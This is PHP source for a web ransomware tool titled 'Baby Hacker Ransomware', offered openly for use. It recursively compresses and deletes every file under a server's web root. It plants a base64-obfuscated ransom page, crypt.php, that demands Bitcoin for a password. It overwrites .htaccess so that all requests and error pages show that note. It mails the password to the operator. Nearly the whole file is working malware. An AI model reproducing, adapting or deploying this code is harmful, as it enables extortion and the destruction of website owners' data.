# Coded By ErrorByte@AnarchoXploit #
<title>Baby Hacker Ransomware</title>
<link rel="shortcut icon" type="image/x-icon" href="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png">
<style>
html {
background: black;
color: white;
}
input { background: transparent; color: white; border: 1px solid white; }
</style>
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
	if (strpos($filename, '.crypt') !== false) {
    return;
	}
	file_put_contents($filename.".crypt", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
copy('.htaccess','.htabackup');
$file = base64_decode("PHRpdGxlPkJhYnkgSGFja2VyIFJhbnNvbXdhcmU8L3RpdGxlPg0KPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vaW1nLmRldXNtLmNvbS9kYXJrcmVhZGluZy9iaC1hc2lhLWZhY2Vib29rLXByb2ZpbGUucG5nIj4NCjxzdHlsZT4NCmh0bWwgew0KYmFja2dyb3VuZDogYmxhY2s7DQpjb2xvcjogd2hpdGU7DQp9DQppbnB1dCB7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBjb2xvcjogd2hpdGU7IGJvcmRlcjogMXB4IHNvbGlkIHdoaXRlOyB9DQo8L3N0eWxlPg0KPD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRpbnB1dCA9ICRfUE9TVFsncGFzcyddOw0KJHBhc3MgPSAiamFuY29ramFyYW4iOw0KaWYoaXNzZXQoJGlucHV0KSkgew0KaWYobWQ1KCRpbnB1dCkgPT0gJHBhc3MpIHsNCmZ1bmN0aW9uIGRlY2ZpbGUoJGZpbGVuYW1lKXsNCglpZiAoc3RycG9zKCRmaWxlbmFtZSwgJy5jcnlwdCcpID09PSBGQUxTRSkgew0KCXJldHVybjsNCgl9DQoJJGRlY3J5cHRlZCA9IGd6aW5mbGF0ZShmaWxlX2dldF9jb250ZW50cygkZmlsZW5hbWUpKTsNCglmaWxlX3B1dF9jb250ZW50cyhzdHJfcmVwbGFjZSgnLmNyeXB0JywgJycsICRmaWxlbmFtZSksICRkZWNyeXB0ZWQpOw0KCXVubGluaygnY3J5cHQucGhwJyk7DQoJdW5saW5rKCcuaHRhY2Nlc3MnKTsNCgl1bmxpbmsoJGZpbGVuYW1lKTsNCgllY2hvICIkZmlsZW5hbWUgRGVjcnlwdGVkICEhITxicj4iOw0KfQ0KDQpmdW5jdGlvbiBkZWNkaXIoJGRpcil7DQoJJGZpbGVzID0gYXJyYXlfZGlmZihzY2FuZGlyKCRkaXIpLCBhcnJheSgnLicsICcuLicpKTsNCgkJZm9yZWFjaCgkZmlsZXMgYXMgJGZpbGUpIHsNCgkJCWlmKGlzX2RpcigkZGlyLiIvIi4kZmlsZSkpew0KCQkJCWRlY2RpcigkZGlyLiIvIi4kZmlsZSk7DQoJCQl9ZWxzZSB7DQoJCQkJZGVjZmlsZSgkZGlyLiIvIi4kZmlsZSk7DQoJCX0NCgl9DQp9DQoNCmRlY2RpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsNCmVjaG8gIjxicj5XZWJyb290IERlY3J5cHRlZDxicj4iOw0KdW5saW5rKCRfU0VSVkVSWydQSFBfU0VMRiddKTsNCnVubGluaygnLmh0YWNjZXNzJyk7DQpjb3B5KCdodGFiYWNrdXAnLCcuaHRhY2Nlc3MnKTsNCmVjaG8gJ1N1Y2Nlc3MgISEhJzsNCn0gZWxzZSB7DQplY2hvICdGYWlsZWQgUGFzc3dvcmQgISEhJzsNCn0NCmV4aXQoKTsNCn0NCj8+DQo8Y2VudGVyPg0KPGgxPkJhYnkgSGFja2VyIFJhbnNvbXdhcmU8L2gxPg0KPGltZyBoZWlnaHQ9IjIwMCIgc3JjPSJodHRwczovL2kuc2NyZWVuc2hvdC5uZXQvazR6MDZ1biIvPg0KPGJyPjxicj4NCjxoMz5Zb3VyIFdlYnNpdGUgSXMgRW5jcnlwdGVkPC9oMz4NCg0KDQpEb24ndCBDaGFuZ2UgdGhlIEZpbGVuYW1lIGJlY2F1c2UgaXQgQ2FuIERhbWFnZSB0aGUgRmlsZSBJZiBZb3UgV2FudCB0byBSZXR1cm4gWW91IE11c3QgRW50ZXIgdGhlIFBhc3N3b3JkIEZpcnN0DQo8YnI+DQpTZW5kIE1lICQzIEZvciBCYWNrIFlvdXIgV2Vic2l0ZSA8YnI+PGJyPg0KQml0Y29pbiBBZGRyZXNzIDogPGlucHV0IHR5cGU9InRleHQiIHZhbHVlPSJrb250b2xhbmppbmciIHJlYWRvbmx5Pg0KPGJyPjxicj4NCjxmb3JtIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0icG9zdCI+DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIj4gPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkRlY3J5cHQiPg0KPC9mb3JtPg0KPGJyPkNvbnRhY3QgTWFpbCA6IGJhYnlAaGFja2VyLm9yZw==");
$q = str_replace('jancokjaran', md5($_POST['pass']), $file);
$w = str_replace('baby@hacker.org', $_POST['email'], $q);
$e = str_replace('kontolanjing', $_POST['btc'], $w);
$r = str_replace('$3', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('crypt.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "DirectoryIndex crypt.php\n
ErrorDocument 403 /crypt.php\n
ErrorDocument 404 /crypt.php\n
ErrorDocument 500 /crypt.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo "$filename Encrypted !!!<br>";
}

function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
				
		}
	}
}

if(isset($_POST['pass'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('crypt.php', $_SERVER['DOCUMENT_ROOT'].'/crypt.php');
copy('.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htaccess');
copy($_SERVER['DOCUMENT_ROOT'].'.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htabackup');
$to = $_POST['email'];
$subject = 'Your Ransomware Info';
$message = "Domain : ".$_SERVER['HTTP_ADDR']."\n\n"."Your Password : ".$_POST['pass'];
if(mail($to,$subject,$message)) {
echo 'Password Saved In Your Mail !!!';
} else {
echo 'Password Not In Your Mail !!!';
}
exit();
}
?>
<center>
<h1>Baby Hacker Ransomware</h1>
<img height="200" src="https://i.screenshot.net/k4z06un"/>
<br><br><h3>Information Server :</h3>
Path File : <font color="red"><?php echo $_SERVER['SCRIPT_FILENAME'] ; ?></font><br>
Disable Function : <font color="red"><?php $ds = @ini_get("disable_functions"); $show_ds = (!empty($ds)) ? "$ds" : "NONE"; echo $show_ds; ?></font>
Mail Function : <font color="red"><?php if(mail('jancok@gmail.com','tes','tes')) { echo "ON"; } else { echo "OFF"; } ?></font>
<br><Br>
<form enctype="multipart/form-data" method="post">
Password Encrypt : <input type="text" name="pass"> Your Email : <input type="text" name="email">
<br><br>
Your Bitcoin Address : <input type="text" name="btc"> Your Price : <input type="text" name="price">
<br><br>
<input type="submit" value="Encrypt">
</form>
